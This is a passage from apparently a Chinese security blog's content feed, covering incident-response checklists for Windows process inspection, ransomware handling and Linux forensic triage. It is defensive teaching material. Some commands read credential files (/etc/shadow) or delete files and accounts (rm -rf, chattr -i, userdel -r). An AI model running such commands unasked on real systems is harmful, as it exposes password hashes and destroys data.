powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=[<span class="type">PID</span>] delete</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> name=<span class="string">&quot;xxx.exe&quot;</span> call terminate</span><br></pre></td></tr></table></figure><h2 id="procexp"><a href="#procexp" class="headerlink" title="procexp"></a>procexp</h2><p>重点检查没有厂商名字、没有 签名验证信息、没有描述信息、CPU 或内存资源占用长时间过高的进程的进程。检查可疑进程的属主、路径是否合法。</p><h3 id="进程颜色"><a href="#进程颜色" class="headerlink" title="进程颜色"></a>进程颜色</h3><ul><li>浅蓝色: 和Process Explorer属于同一个用户的进程。</li><li>粉红色： 服务进程，通常会包含一个或多个Windows服务。</li><li>黄色： .NET进程。</li><li>深灰色： 挂起的进程。</li><li>紫色： 标识包含压缩或者加密的可执行代码的进程。一些病毒软件经常会利用这种方式绕过杀毒软件。</li><li>红色： 刚刚退出的进程。</li></ul><h3 id="显示选项"><a href="#显示选项" class="headerlink" title="显示选项"></a>显示选项</h3><p>1.显示进程当前的权限，是系统用户权限还是网络管理员权限还是普通管理员权限（User Name）<br>2.显示进程的文件路径（Image Path）<br>3.显示进程是64位进程还是32位的（Image Type）<br>4.显示进程当前所在的Session ID（session）<br>5.显示进程命令行参数(Command Line)</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617095435663.png" alt="faefae"></p><p><a href="https://blog.csdn.net/linxinfa/article/details/106800716">参考链接</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617095730418.png" alt="gaioengmeqmn"></p><p>显示当前进程的<code>GDI</code>对象个数，内核对象个数，线程个数。</p><blockquote><p>GDI是Graphics Device Interface的缩写，含义是图形设备接口，它的主要任务是负责系统与绘图程序之间的信息交换，处理所有Windows程序的图形输出。<br>在Windows操作系统下，绝大多数具备图形界面的应用程序都离不开GDI，我们利用GDI所提供的众多函数就可以方便的在屏幕、打印机及其它输出设备上输出图形，文本等操作。</p></blockquote><h3 id="显示当前进程所加载的DLL"><a href="#显示当前进程所加载的DLL" class="headerlink" title="显示当前进程所加载的DLL"></a>显示当前进程所加载的DLL</h3><p>选择<code>View - Lower Pane View - DLLs</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617100017575.png" alt="adgagerage"></p><p>通过这种方式可以观察，我们的进程是否被其他程序注入<code>DLL</code>，了解当前进程使用了那些编程技术。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617100236861.png" alt="ahrgrgaregra"></p><p>我们可以修改DLL的选项卡让其显示更多的内容，比如DLL基地址，DLL内存相关信息等</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101011418.png" alt="在这里插入图片描述"></p><h3 id="显示当前进程所占用的系统资源句柄"><a href="#显示当前进程所占用的系统资源句柄" class="headerlink" title="显示当前进程所占用的系统资源句柄"></a>显示当前进程所占用的系统资源句柄</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101256730.png" alt="在这里插入图片描述"></p><p>我们查看当前进程所占用的资源句柄表，分析进程的逻辑：如图下图<code>SunloginClient.exe</code>进程创建了一个Event事件，并且占用一个Log文件，可以检查自己的程序是否有内核句柄泄露。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/2020061710143863.png" alt="在这里插入图片描述"></p><h3 id="操控进程以及显示进程的内部信息"><a href="#操控进程以及显示进程的内部信息" class="headerlink" title="操控进程以及显示进程的内部信息"></a>操控进程以及显示进程的内部信息</h3><p>操控进程，杀掉进程、重启进程、挂起进程等</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617102443713.png" alt="在这里插入图片描述"></p><p>显示进程的内部信息</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101721152.png" alt="在这里插入图片描述"></p><p>查看线程信息（还可以查当前进程环境变量、进程网络连接情况等）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101940718.png" alt="在这里插入图片描述"></p><h3 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h3><p>有时候我们删除某个文件或文件夹的时候，会提示被某个服务占用，无法删除，这个时候，就可以使用搜索功能知道它被谁占用了，比如shell.20200608-082337.log文件被SunloginClient.exe占用了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617103428394.png" alt="在这里插入图片描述"></p><h4 id="DLL搜索"><a href="#DLL搜索" class="headerlink" title="DLL搜索"></a>DLL搜索</h4><p>当你在磁盘上发现一个恶意的DLL，并且想知道是否有运行进程使用了这个DLL时，可以使用Find =&gt; find Handle on DLL 功能。</p><p>一些常见的DLL：</p><p><code>Ntdll.dll</code>：如果一个可执行文件载入了这个文件，这意味着作者企图使用那些不是正常提供给windows程序使用的函数。如隐藏功能和操作进程等任务会使用这个接口。<br><code>Wsock32.dll</code>和<code>Ws32.dll</code>：这个两个是联网ＤＬＬ，访问其中任一个DLL的程序非常可能连接网络，或是执行网络相关的任务。<br><code>Wininet.dll</code>：这个DLL包含了更高层次的网络函数，实现了如FTP、HTTP和NTP等协议。</p><h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><p>win+r <code>services.msc</code></p><h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><p>三个方向：</p><ul><li><p>敏感路径</p></li><li><p>时间点</p></li><li><p>文件特征–代码关键字，关键函数，文件权限</p></li></ul><h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><h3 id="1-temp-tmp-相关目录"><a href="#1-temp-tmp-相关目录" class="headerlink" title="1.temp(tmp)相关目录"></a>1.temp(tmp)相关目录</h3><blockquote><p>因为临时路径相对统一</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp</span><br></pre></td></tr></table></figure><h3 id="2-排查下载记录，浏览器访问记录"><a href="#2-排查下载记录，浏览器访问记录" class="headerlink" title="2.排查下载记录，浏览器访问记录"></a>2.排查下载记录，浏览器访问记录</h3><h3 id="3-查看用户Recent文件"><a href="#3-查看用户Recent文件" class="headerlink" title="3.查看用户Recent文件"></a>3.查看用户Recent文件</h3><p>Recent存储最近运行文件的快捷方式</p><p>存储位置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br></pre></td></tr></table></figure><p>先要开启隐藏文件夹</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122155627701.png" alt="image-20211122155627701"></p><p>更改所有者</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122155724944.png" alt="image-20211122155724944"></p><h3 id="4-预读取文件查看"><a href="#4-预读取文件查看" class="headerlink" title="4.预读取文件查看"></a>4.预读取文件查看</h3><p><strong>Prefetch</strong>，预读取文件，存放系统已经访问过的预读取文件信息，扩展名<code>pf</code></p><p>运行对话框输入<code>%SystemRoot%\Prefetch</code>打开<code>C:\Windows\Prefetch</code></p><p>查看工具 winprefetchview</p><p><a href="https://www.nirsoft.net/utils/win_prefetch_view.html">https://www.nirsoft.net/utils/win_prefetch_view.html</a></p><p><strong>Amcache.hve</strong>，查询应用程序的执行路径，上次执行时间以及SHA1值</p><p>win+r  –&gt; <code>%SystemRoot%\appcompat\Programs</code> 打开打开<code>Amcache.hev</code>文件夹。</p><p>解析方式</p><p><a href="https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py">https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py</a></p><h2 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h2><h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p>特殊时间内<strong>新增</strong>的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /m *exe /d +<span class="number">2021</span>/<span class="number">5</span>/<span class="number">15</span> /s /p c:\ /c <span class="string">&quot;cmd /c echo @path @fdate @ftime&quot;</span> <span class="number">2</span>&gt; null</span><br></pre></td></tr></table></figure><p>特殊时间内<strong>修改</strong>的文件</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122160450094.png" alt="image-20211122160450094"></p><blockquote><p>判断创建时间，修改时间，访问时间是否存在逻辑问题</p></blockquote><h2 id="文件特征"><a href="#文件特征" class="headerlink" title="文件特征"></a>文件特征</h2><h3 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h3><p><a href="http://www.d99net.net/index.asp">D盾</a></p><p><a href="https://www.hws.com/soft/hostmaster/">HwsKill</a></p><p><a href="https://www.shellpub.com/">河马查杀</a></p><h1 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h1><p><a href="https://dropann.github.io/p/24f823ca.html">windows 日志</a></p><h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><h2 id="powershell获取hash"><a href="#powershell获取hash" class="headerlink" title="powershell获取hash"></a>powershell获取hash</h2><p><code>Get-FileHash 文件路径 -Algorithm 校验的Hash值类型| Format-List</code></p><blockquote><p>如果需要校验的文件路径比较复杂，例如路径中包含空格、括号等特殊符号，则需要在路径前后加上英文双引号。</p><p>Windows PowerShell命令可以校验的Hash值类型包括：SHA1、SHA256、SHA384、SHA512、MACTripleDES、MD5、RIPEMD160，暂不支持校验CRC32值。</p><p>如果不带-Algorithm参数，也就是不指明验证的Hash值类型，那么默认验证的就是SHA256值</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe <span class="literal">-Algorithm</span> MD5| <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe <span class="literal">-Algorithm</span> SHA1| <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure><h1 id="综合工具"><a href="#综合工具" class="headerlink" title="综合工具"></a>综合工具</h1><p>PcHunter</p><p>火绒剑</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒应急处置</title>
      <link href="/p/c2567ef7.html"/>
      <url>/p/c2567ef7.html</url>
      
        <content type="html"><![CDATA[<p>勒索病毒，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access attack），其与其他病毒最大的不同在于手法以及中毒方式。其中一种勒索软件仅是单纯地将受害者的电脑锁起来，而另一种则系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以便解密文件。勒索软件通常透过木马病毒的形式传播，将自身为掩盖为看似无害的文件，通常会通过假冒成普通的电子邮件等社会工程学方法欺骗受害者点击链接下载，但也有可能与许多其他蠕虫病毒一样利用软件的漏洞在联网的电脑间传播。本文重点放在一线人员如何处置勒索病毒，溯源攻击方法。</p><h1 id="常规处置方法"><a href="#常规处置方法" class="headerlink" title="常规处置方法"></a>常规处置方法</h1><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211118192242334.png" alt="image-20211118192242334"></p><h2 id="错误处置："><a href="#错误处置：" class="headerlink" title="错误处置："></a>错误处置：</h2><ol><li>使用u盘，硬盘等移动存储设备，挂载共享盘等存储服务。</li><li>多次对被勒索后的文件进行解密操作，可能破坏原始文件降低解密的可能性。</li></ol><h2 id="隔离被感染主机-服务器"><a href="#隔离被感染主机-服务器" class="headerlink" title="隔离被感染主机/服务器"></a>隔离被感染主机/服务器</h2><ol><li>断网，断电（断网&gt;断电）</li><li>对网络资源访问控制权限做严格认证和控制</li></ol><h1 id="确认勒索病毒种类"><a href="#确认勒索病毒种类" class="headerlink" title="确认勒索病毒种类"></a>确认勒索病毒种类</h1><h2 id="确认勒索病毒名称，家族查看是否有解密的可能性"><a href="#确认勒索病毒名称，家族查看是否有解密的可能性" class="headerlink" title="确认勒索病毒名称，家族查看是否有解密的可能性"></a>确认勒索病毒名称，家族查看是否有解密的可能性</h2><h3 id="病毒查询网站"><a href="#病毒查询网站" class="headerlink" title="病毒查询网站"></a>病毒查询网站</h3><p><a href="https://guanjia.qq.com/pr/ls/">腾讯勒索病毒搜索引擎</a></p><p><a href="https://lesuobingdu.360.cn/">360勒索病毒解密</a></p><p><a href="https://lesuobingdu.qianxin.com/">奇安信勒索病毒搜索引擎</a></p><p><a href="https://www.nomoreransom.org/crypto-sheriff.php?lang=zh">nomoreransom-解码刑警</a></p><p><a href="https://lesuo.venuseye.com.cn/">VenusEye威胁情报中心-勒索病毒搜索引擎</a></p><p><a href="https://id-ransomware.malwarehunterteam.com/">id-ransomware</a></p><p> <a href="https://edr.sangfor.com.cn/#/information/ransom_search">深信服勒索病毒查找</a></p><blockquote><p>如果网站找不到，根据勒索信的格式，交付赎金网站的样式进行排查。</p></blockquote><h3 id="病毒解密工具集"><a href="#病毒解密工具集" class="headerlink" title="病毒解密工具集"></a>病毒解密工具集</h3><p><a href="https://habo.qq.com/tool/detail/ransomware_recovery_tools">哈勃勒索病毒解密助手</a></p><p><a href="https://github.com/jiansiting/Decryption-Tools">GitHub项目</a></p><p><a href="http://it.rising.com.cn/fanglesuo/index.html">瑞星防勒索专题社区</a></p><p><a href="https://www.nomoreransom.org/zh/decryption-tools.html">nomoreransom解密工具</a></p><p><a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">Avast解密工具</a></p><p><a href="https://noransom.kaspersky.com/zh/">kaspersky卡巴斯基解密器</a></p><p><a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">Emsisoft</a></p><p><a href="https://www.trendmicro.com/zh_hk/forHome/products/free-tools.html">趋势科技</a></p><p><a href="https://www.quickheal.com/free-ransomware-decryption-tool/">quickheal</a></p><p><a href="https://www.avg.com/en-ww/ransomware-decryption-tools">AVG</a></p><h2 id="确认勒索病毒传播方式"><a href="#确认勒索病毒传播方式" class="headerlink" title="确认勒索病毒传播方式"></a>确认勒索病毒传播方式</h2><p>如果上面能确认病毒类型，就去找这些病毒对应行为，样本特征（找样本是主要目标，一找到样本就能确定病毒攻击链）作为排查方向，但也不是100%的，有可能<strong>老毒用新洞</strong>。</p><p>当全网都没有收录这个勒索病毒信息的时候，就去猜它的入侵途径：</p><h3 id="暴力破解入侵"><a href="#暴力破解入侵" class="headerlink" title="暴力破解入侵"></a>暴力破解入侵</h3><p>查系统安全日志</p><p><a href="https://dropann.github.io/p/75bed629.html">主机暴力破解日志特征</a></p><h3 id="勒索病毒利用的常见漏洞"><a href="#勒索病毒利用的常见漏洞" class="headerlink" title="勒索病毒利用的常见漏洞"></a>勒索病毒利用的常见漏洞</h3><p>Win32k提权漏洞CVE-2018-8120</p><p>WindowsALPC提权漏洞CVE-2018-8440</p><p>Weblogic反序列化漏洞</p><blockquote><p>这里漏洞是列举不完的，我们当下应该关注被勒索服务器/主机实际业务做出合理推测，而且如果有老旧漏洞上面勒索病毒搜索引擎大概率是能找出来的，优先级上应该关注在野高危0day在勒索病毒上的应用。</p></blockquote><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><p>挖坑</p><h3 id="邮件附件"><a href="#邮件附件" class="headerlink" title="邮件附件"></a>邮件附件</h3><p>查邮件附件MD5放到威胁情报网站上去。</p><p>挖坑</p><h3 id="利用网页挂马传播"><a href="#利用网页挂马传播" class="headerlink" title="利用网页挂马传播"></a>利用网页挂马传播</h3><p>攻击者入侵主流网站，在正常网页植入木马。或者访问者访问恶意网站，其利用IE、Flash等软件漏洞进行攻击。</p><h3 id="找C2服务器"><a href="#找C2服务器" class="headerlink" title="找C2服务器"></a>找C2服务器</h3><p>看流量设备（NTA）查外联C2服务器。具体什么看挖坑</p><blockquote><p>需要注意的是：攻击者在对文件加密的过程中，可能不使用C2服务器，现在加密时可能不需要回传密钥。</p></blockquote><h1 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h1><p>其实就是用上面已知的信息做个汇总</p><ul><li>日志分析结果</li><li>病毒分析结果</li><li>主机安全漏洞排查情况</li><li>病毒植入方式分析</li><li>病毒影响范围与网络拓扑综合判断</li><li>病毒扩散的方向-有外网入侵或内网系统相互传播</li><li>初步给出入侵时间线、可疑 IP、其他可疑判断攻击者的数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux取证溯源</title>
      <link href="/p/cc74cf72.html"/>
      <url>/p/cc74cf72.html</url>
      
        <content type="html"><![CDATA[<p>本文是针对应急响应中linux排查思路做一个固化（其实是在客户现场发呆😐也不好），方便自己能够快速排查linux中的问题，溯源攻击方法。主要包含（系统、网络、进程、启动项、服务、文件痕迹等信息）其中还有内存分析，日志分析，流量分析等，新开文章进行总结。</p><h1 id="易丢失数据"><a href="#易丢失数据" class="headerlink" title="易丢失数据"></a>易丢失数据</h1><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 真实时间</span></span><br><span class="line">date -R</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看Linux内核版本</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出目前与过去登录系统的用户相关信息</span></span><br><span class="line">last</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 观察硬盘实体使用情况</span></span><br><span class="line">fdisk -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看挂载</span></span><br><span class="line">mount</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看内存</span></span><br><span class="line">more /proc/meminfo &gt; memoryinfo.log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看mac地址信息</span></span><br><span class="line">cat /etc/udev/rules.d/70-persistent-net.rules</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CPU基础信息</span></span><br><span class="line">lscpu</span><br></pre></td></tr></table></figure><h2 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install net-tools     [On CentOS/RHEL]</span><br><span class="line">apt install net-tools     [On Debian/Ubuntu]</span><br><span class="line">zypper install net-tools  [On OpenSuse]</span><br><span class="line">pacman -S netstat-nat     [On Arch Linux]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure><ul><li>-a 显示所有</li><li>-t 仅显示tcp</li><li>-u 仅显示udp</li><li>-n 拒绝显示别名，直接使用ip地址</li><li>-l 仅列出监听状态的服务</li><li>-p 显示建立相关链接的程序名</li><li>-r 路由信息，路由表</li><li>-e 扩展信息，例如uid</li><li>-s 按各个协议进行统计</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><h3 id="进程对应可执行程序"><a href="#进程对应可执行程序" class="headerlink" title="进程对应可执行程序"></a>进程对应可执行程序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /proc/[PID]</span><br></pre></td></tr></table></figure><h3 id="进程打开文件"><a href="#进程打开文件" class="headerlink" title="进程打开文件"></a>进程打开文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p [PID]</span><br></pre></td></tr></table></figure><h3 id="获取socket统计信息"><a href="#获取socket统计信息" class="headerlink" title="获取socket统计信息"></a>获取socket统计信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -s</span><br></pre></td></tr></table></figure><h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:端口号</span><br></pre></td></tr></table></figure><blockquote><p>查看端口占用</p></blockquote><h2 id="进程数据"><a href="#进程数据" class="headerlink" title="进程数据"></a>进程数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">ps aux &gt; ps.log</span><br><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><ul><li>-e  显示环境变量</li><li>-f  显示程序间的关系</li><li>-aux 显示所有包含其他使用者的进程</li></ul><h3 id="处理恶意进程"><a href="#处理恶意进程" class="headerlink" title="处理恶意进程"></a>处理恶意进程</h3><p><code>kill -9 [PID]</code> 结束进程</p><p><code>rm -rf [filename]</code> 删除文件</p><p>如果<code>root</code>用户都无法删除</p><p><code>lsatter filename</code> 查看文件属性</p><p><code>chattr -i [filename]</code> 移除<code>i</code>属性</p><h3 id="查看隐藏进程"><a href="#查看隐藏进程" class="headerlink" title="查看隐藏进程"></a>查看隐藏进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc | sort -n | uniq &gt;2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h3 id="依照进程号查看拉起服务"><a href="#依照进程号查看拉起服务" class="headerlink" title="依照进程号查看拉起服务"></a>依照进程号查看拉起服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status [pid]</span><br><span class="line">cat /proc/[pid]/stat #第四列的值是父进程pid</span><br></pre></td></tr></table></figure><h3 id="提取为实际运行程序的符号链接"><a href="#提取为实际运行程序的符号链接" class="headerlink" title="提取为实际运行程序的符号链接"></a>提取为实际运行程序的符号链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /proc/[pid]/exe xxx</span><br><span class="line">md5sum xxx</span><br></pre></td></tr></table></figure><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户"><a href="#查看系统所有用户" class="headerlink" title="查看系统所有用户"></a>查看系统所有用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p> 用户名：密码： 用户id： 用户组id： 注释： 用户组目录： 默认登录shell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat/etc/shadow</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/shadow | cut -d : -f 1</span><br></pre></td></tr></table></figure><blockquote><p>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</p></blockquote><h3 id="查看超级权限账户-amp-amp-可登录-uid-为0"><a href="#查看超级权限账户-amp-amp-可登录-uid-为0" class="headerlink" title="查看超级权限账户&amp;&amp;可登录(uid 为0)"></a>查看超级权限账户&amp;&amp;可登录(uid 为0)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0) print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="查看可以远程登录的帐号信息"><a href="#查看可以远程登录的帐号信息" class="headerlink" title="查看可以远程登录的帐号信息"></a>查看可以远程登录的帐号信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure><h3 id="查看sudo权限账号"><a href="#查看sudo权限账号" class="headerlink" title="查看sudo权限账号"></a>查看sudo权限账号</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211116203048581.png" alt="image-20211116203048581"></p><p><a href="https://sysin.org/blog/linux-root/">关于 root 和 wheel：在 Linux 中创建管理员账号（root 权限）的正确方式</a></p><h3 id="错误的登录信息"><a href="#错误的登录信息" class="headerlink" title="错误的登录信息"></a>错误的登录信息</h3><p><code>lastb</code></p><h3 id="用户最后登录信息"><a href="#用户最后登录信息" class="headerlink" title="用户最后登录信息"></a>用户最后登录信息</h3><p><code>lastlog | more</code></p><h3 id="用户最近登录信息"><a href="#用户最近登录信息" class="headerlink" title="用户最近登录信息"></a>用户最近登录信息</h3><p><code>last</code></p><p><code>/var/log/wtmp</code> 存储成功登录信息</p><p><code>/var/log/btmp</code> 存储失败登录信息</p><p><code>/var/log/utmp</code> 存储当前正在登录信息</p><h3 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h3><p>本地登录以及通过SSH登录的账户信息和用户信息</p><p><code>who</code>或者<code>w</code></p><blockquote><p>两者的区别在于，w 命令除了能知道目前已登陆的用户信息，还可以知道每个用户执行任务的情况。</p></blockquote><p><code>uptime</code> : 查看登陆多久、多少用户，负载</p><p><code>uptime -p tty1</code></p><h3 id="空口令账户"><a href="#空口令账户" class="headerlink" title="空口令账户"></a>空口令账户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print$1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="处理可疑账号"><a href="#处理可疑账号" class="headerlink" title="处理可疑账号"></a>处理可疑账号</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h2 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h2><h3 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 